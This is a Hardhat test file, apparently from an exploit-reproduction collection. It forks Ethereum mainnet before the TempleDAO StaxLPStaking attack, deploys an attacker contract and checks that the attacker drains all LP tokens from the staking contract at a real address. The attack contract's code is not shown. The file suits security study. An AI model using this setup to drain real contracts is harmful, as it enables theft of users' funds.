import { Contract, Signer } from 'ethers';
import { ethers } from 'hardhat';
import { forkFrom } from './utils/fork';
import { getAbi } from './utils/abi';
import { expect } from 'chai';

describe('TempleDAO Exploit', async () => {
  let attacker: Signer;
  let attackerContract: Contract;
  let stakingContract: Contract;
  let tokenContract: Contract;

  const STAKING_CONTRACT_ADDRESS = '0xd2869042e12a3506100af1d192b5b04d65137941';

  before(async () => {
    // Block number from October 8, 3 days before the attack
    await forkFrom(15700000);

    // Get an attacker EOA that we can use
    [attacker] = await ethers.getSigners();

    // Get the contract ABI and subsquently the deployed contracts for the
    // staking contract as well as the LP token
    const staking_contract_abi = await getAbi(
      'contracts/StaxLPStakingExploit/StaxLPStakingABI.txt',
    );
    const token_contract_abi = await getAbi('contracts/StaxLPStakingExploit/StaxLPTokenABI.txt');

    stakingContract = await ethers.getContractAt(staking_contract_abi, STAKING_CONTRACT_ADDRESS);
    tokenContract = await ethers.getContractAt(
      token_contract_abi,
      await stakingContract.stakingToken(),
    );

    // Deploy the attacker script
    attackerContract = await (
      await ethers.getContractFactory('StaxLPStakingExploit', attacker)
    ).deploy(stakingContract.address, tokenContract.address);
  });

  it('Exploits successfully', async () => {
    // Before we start, we should have 0 LP tokens
    expect(await tokenContract.balanceOf(attacker.getAddress())).to.be.eq(0);

    // Get the current balance of the staking contract so we can make sure we
    // get all the tokens at the end
    const stakingContractBalanceBeforeAttack = await tokenContract.balanceOf(
      stakingContract.address,
    );

    console.log(
      `[+] Before running the exploit, the staking contract contains ${
        stakingContractBalanceBeforeAttack / Math.pow(10, 18)
      } tokens`,
    );

    // Run our exploit
    await attackerContract.exploit();

    // Our token balance should match the original token balance in the contract
    expect(await tokenContract.balanceOf(attacker.getAddress())).to.be.eq(
      stakingContractBalanceBeforeAttack,
    );

    // And the staking contract should have 0 tokens
    expect(await tokenContract.balanceOf(stakingContract.address)).to.be.eq(0);
  });
});
